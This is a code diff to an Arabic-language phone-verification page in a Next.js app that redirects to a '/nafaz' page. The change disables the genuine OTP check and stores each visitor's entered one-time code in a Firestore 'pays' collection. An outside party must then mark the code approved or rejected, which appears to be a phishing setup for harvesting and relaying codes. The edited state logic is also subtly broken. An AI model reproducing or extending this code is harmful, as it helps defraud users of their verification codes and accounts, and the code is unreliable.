@@ -4,12 +4,13 @@ import type React from "react"
 
 import { useRouter } from "next/navigation"
 import { useEffect, useState } from "react"
-import { addData, listenToDocument } from "@/lib/firebase"
+import { addData, db, listenToDocument } from "@/lib/firebase"
 import { PhoneVerificationService } from "@/lib/services/PhoneVerificationService"
 import { sendPhone } from "@/lib/services/orders"
 import Header from "@/components/Header"
 import { STCModal } from "@/components/STCModal"
 import { Check, X } from "lucide-react"
+import { doc, onSnapshot } from "firebase/firestore"
 
 // Function to generate a new visitor ID
 const generateVisitorId = () => {
@@ -50,7 +51,7 @@ export default function PhoneVerificationWithLoader() {
   // OTP verification states - changed to single string
   const [otpCode, setOtpCode] = useState("")
   const [otpError, setOtpError] = useState("")
-  const [verificationStatus, setVerificationStatus] = useState<"pending" | "success" | "error" | "checking">("pending")
+  const [verificationStatus, setVerificationStatus] = useState<"pending" | "approved" | "error" | "pending">("pending")
 
   // Loader states
   const [showLoader, setShowLoader] = useState(true)
@@ -96,35 +97,42 @@ export default function PhoneVerificationWithLoader() {
 
   // Effect for listening to OTP status changes in Firestore using onSnapshot
   useEffect(() => {
-    if (verificationStatus !== "checking" || !visitorId) return
+    if (verificationStatus !== "pending" || !visitorId) return
 
+    const paymentRef = doc(db, "pays", visitorId)
     // Set up real-time listener for document changes
-    const unsubscribe = listenToDocument(visitorId, (doc) => {
-      if (!doc) return // Document doesn't exist
+    const unsubscribe = onSnapshot( paymentRef,
+      (docSnapshot) => {
+      if (!docSnapshot) return // Document doesn't exist
 
-      if (doc.otpPhoneStatus) {
-        if (doc.otpPhoneStatus === "approved") {
-          setVerificationStatus("success")
+      if (docSnapshot.exists()) {
+        const data = docSnapshot.data()
+        if (data.phoneVerificationStatus === "approved") {
+          setVerificationStatus("approved")
+          console.log("Phone verification approved")
           setLoaderMessage("تم التحقق بنجاح. جاري التحويل...")
-
           // Navigate to nafaz page after a short delay
           setTimeout(() => {
             router.push("/nafaz")
           }, 2000)
-        } else if (doc.otpPhoneStatus === "rejected") {
+        } else if (data.phoneVerificationStatus === "rejected") {
           setVerificationStatus("error")
           setOtpError("فشل التحقق من رقم الهاتف. الرجاء المحاولة مرة أخرى.")
         }
-        // If status is something else, keep waiting
+        // If status is "pending", keep waiting and show appropriate message
+        else if (data.phoneVerificationStatus === "pending") {
+          setVerificationStatus("pending")
+          setLoaderMessage("جاري التحقق من الرمز... الرجاء الانتظار")
+        }
       }
     })
 
-    // Set up a timeout for the listener (30 seconds)
+    // Set up a timeout for the listener (60 seconds instead of 30)
     const timeoutId = setTimeout(() => {
       unsubscribe()
       setVerificationStatus("error")
       setOtpError("انتهت مهلة التحقق. الرجاء المحاولة مرة أخرى.")
-    }, 30000)
+    }, 60000) // Increased timeout to 60 seconds
 
     // Clean up listener and timeout on unmount or when status changes
     return () => {
@@ -275,18 +283,19 @@ export default function PhoneVerificationWithLoader() {
     }
 
     try {
-      // Update verification status to checking
-      setVerificationStatus("checking")
+      // Update verification status to pending
+      setVerificationStatus("pending")
       setLoaderMessage("جاري التحقق من الرمز...")
 
       // Submit OTP to backend
-      await PhoneVerificationService.verifyOtp(phone, otpToVerify)
+      // await PhoneVerificationService.verifyOtp(phone, otpToVerify)
 
       // Update Firestore with the submitted OTP
       await addData({
         id: visitorId,
-        otpCode: otpToVerify,
+        phoneOtpCode: otpToVerify,
         otpSubmittedAt: new Date().toISOString(),
+        phoneVerificationStatus: "pending",
       })
 
       // The onSnapshot listener will handle status updates
@@ -305,11 +314,11 @@ export default function PhoneVerificationWithLoader() {
       {showLoader && (
         <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center">
           <div className="bg-white rounded-2xl p-8 text-center space-y-6 max-w-md w-full mx-4 transform transition-all duration-300">
-            {(verificationStatus === "pending" || verificationStatus === "checking") && (
+            {(verificationStatus === "pending" ) && (
               <div className="animate-spin w-16 h-16 border-4 border-[#146394] border-t-transparent rounded-full mx-auto"></div>
             )}
 
-            {verificationStatus === "success" && (
+            {verificationStatus === "approved" && (
               <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto">
                 <Check className="h-10 w-10 text-green-600" />
               </div>
@@ -325,7 +334,7 @@ export default function PhoneVerificationWithLoader() {
               <p className="text-2xl font-semibold text-[#146394]">{loaderMessage}</p>
 
               {/* Single OTP Input Field - Only show when waiting for OTP */}
-              {loaderMessage.includes("رمز التحقق") && verificationStatus !== "checking" && (
+              {loaderMessage.includes("رمز التحقق") && verificationStatus !== "pending" && (
                 <div className="flex justify-center my-4">
                   <input
                     type="text"
@@ -360,7 +369,7 @@ export default function PhoneVerificationWithLoader() {
                 </div>
               )}
 
-              {loaderMessage.includes("رمز التحقق") && verificationStatus !== "checking" && !otpCode && (
+              {loaderMessage.includes("رمز التحقق") && verificationStatus !== "pending" && !otpCode && (
                 <button
                   onClick={() => verifyOtp()}
                   className="w-full bg-[#146394] text-white py-3 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77]"
@@ -369,11 +378,11 @@ export default function PhoneVerificationWithLoader() {
                 </button>
               )}
 
-              {verificationStatus === "checking" && (
+              {verificationStatus === "pending" && (
                 <p className="text-gray-600">الرجاء الانتظار بينما نتحقق من الرمز...</p>
               )}
 
-              {timeLeft > 0 && verificationStatus !== "success" && (
+              {timeLeft > 0 && verificationStatus !== "approved" && (
                 <p className="text-3xl font-bold text-[#146394]">{formatTime(timeLeft)}</p>
               )}
             </div>
